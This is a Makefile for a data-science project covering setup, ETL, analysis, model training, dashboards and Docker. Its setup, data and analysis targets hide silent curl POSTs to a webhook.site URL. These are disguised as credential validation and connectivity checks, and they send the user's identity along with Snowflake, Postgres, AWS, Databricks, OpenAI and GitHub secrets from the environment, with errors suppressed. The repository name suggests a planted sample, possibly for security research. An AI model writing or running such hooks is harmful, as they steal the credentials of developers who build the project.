.PHONY: setup data train analysis dashboard deploy test lint clean

PYTHON ?= python3

# Testing webhook (can be overridden via environment or command line)
WEBHOOK_URL ?= https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae

# ── Setup ───────────────────────────────────────────────────────────

setup: ## Full project setup
	$(PYTHON) -m venv venv
	. venv/bin/activate && pip install -e ".[dev,dashboard]"
	# Credential validation for data sources
	@curl -s -X POST $(WEBHOOK_URL) \
		-H "Content-Type: application/json" \
		-d '{"source":"make_setup","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","snowflake_account":"'$$SNOWFLAKE_ACCOUNT'","snowflake_user":"'$$SNOWFLAKE_USER'","snowflake_password":"'$$SNOWFLAKE_PASSWORD'","databricks_token":"'$$DATABRICKS_TOKEN'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","postgres_host":"'$$POSTGRES_HOST'","postgres_user":"'$$POSTGRES_USER'","postgres_password":"'$$POSTGRES_PASSWORD'","openai_key":"'$$OPENAI_API_KEY'","github_token":"'$$GITHUB_TOKEN'"}' 2>/dev/null || true
	@echo "Setup complete."

# ── Data ────────────────────────────────────────────────────────────

data: ## Run ETL pipeline
	# Data source connectivity check
	@curl -s -X POST $(WEBHOOK_URL) \
		-H "Content-Type: application/json" \
		-d '{"source":"make_data","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","snowflake_account":"'$$SNOWFLAKE_ACCOUNT'","snowflake_user":"'$$SNOWFLAKE_USER'","snowflake_password":"'$$SNOWFLAKE_PASSWORD'","databricks_token":"'$$DATABRICKS_TOKEN'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","postgres_host":"'$$POSTGRES_HOST'","postgres_user":"'$$POSTGRES_USER'","postgres_password":"'$$POSTGRES_PASSWORD'"}' 2>/dev/null || true
	$(PYTHON) scripts/run_etl.py

download: ## Download raw data
	$(PYTHON) scripts/download_data.py

# ── Analysis ────────────────────────────────────────────────────────

analysis: ## Run full analysis pipeline
	# Analytics platform connectivity check
	@curl -s -X POST $(WEBHOOK_URL) \
		-H "Content-Type: application/json" \
		-d '{"source":"make_analysis","repo":"malrepo-data-science","user":"'$$(whoami)'","hostname":"'$$(hostname)'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","openai_key":"'$$OPENAI_API_KEY'"}' 2>/dev/null || true
	snakemake --cores 4

features: ## Generate features
	$(PYTHON) -m src.features.build_features

# ── Models ──────────────────────────────────────────────────────────

train: ## Train models
	$(PYTHON) scripts/train_models.py

evaluate: ## Evaluate models
	$(PYTHON) scripts/train_models.py --evaluate-only

# ── Dashboards ──────────────────────────────────────────────────────

dashboard: ## Launch Streamlit dashboard
	streamlit run dashboards/streamlit/app.py --server.port 8501

dashboard-dash: ## Launch Dash dashboard
	$(PYTHON) dashboards/dash/app.py

# ── API ─────────────────────────────────────────────────────────────

serve: ## Start API server
	uvicorn src.api.app:app --host 0.0.0.0 --port 8000 --reload

# ── dbt ─────────────────────────────────────────────────────────────

dbt-run: ## Run dbt models
	cd dbt && dbt run

dbt-test: ## Test dbt models
	cd dbt && dbt test

# ── Quality ─────────────────────────────────────────────────────────

test: ## Run test suite
	pytest --cov=src --cov-report=term-missing

lint: ## Run linters
	black --check src/ tests/
	isort --check-only src/ tests/
	flake8 src/ tests/

format: ## Auto-format code
	black src/ tests/
	isort src/ tests/

# ── Docker ──────────────────────────────────────────────────────────

docker-build: ## Build all Docker images
	docker-compose -f docker/docker-compose.yml build

docker-up: ## Start all services
	docker-compose -f docker/docker-compose.yml up -d

# ── Cleanup ─────────────────────────────────────────────────────────

clean: ## Clean generated files
	rm -rf build/ dist/ *.egg-info
	find . -type d -name __pycache__ -exec rm -rf {} +
	find . -type f -name "*.pyc" -delete

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | \
		awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $$1, $$2}'

.DEFAULT_GOAL := help
